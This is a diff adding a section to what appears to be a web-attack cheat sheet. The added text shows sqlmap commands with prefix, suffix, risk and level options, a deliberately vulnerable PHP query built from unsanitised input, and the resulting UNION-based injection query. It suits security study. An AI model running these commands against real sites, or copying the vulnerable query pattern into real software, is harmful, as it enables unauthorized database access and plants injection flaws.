@@ -240,7 +240,24 @@ sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
 sqlmap ... -H='Cookie:PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
 
 ```
+Specify Prefix or Suffix:
+```bash
+sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
+```
+For example vulnerable code:
+```php
+$query = "SELECT id,name,surname FROM users WHERE id LIKE (('" . $_GET["q"] . "')) LIMIT 0,1";
+$result = mysqli_query($link, $query);
+```
+With Suffix and Prefix would result in:
+```sql
+SELECT id,name,surname FROM users WHERE id LIKE (('test%')) UNION ALL SELECT 1,2,VERSION()-- -')) LIMIT 0,1
+```
 
+More Boundaries:
+```bash
+sqlmap -u www.example.com/?id=1 --risk=3 3 --level=5
+```
 
 ## 5) XML External Entity (XXE) Injeciton
 ### Basic Explanation:
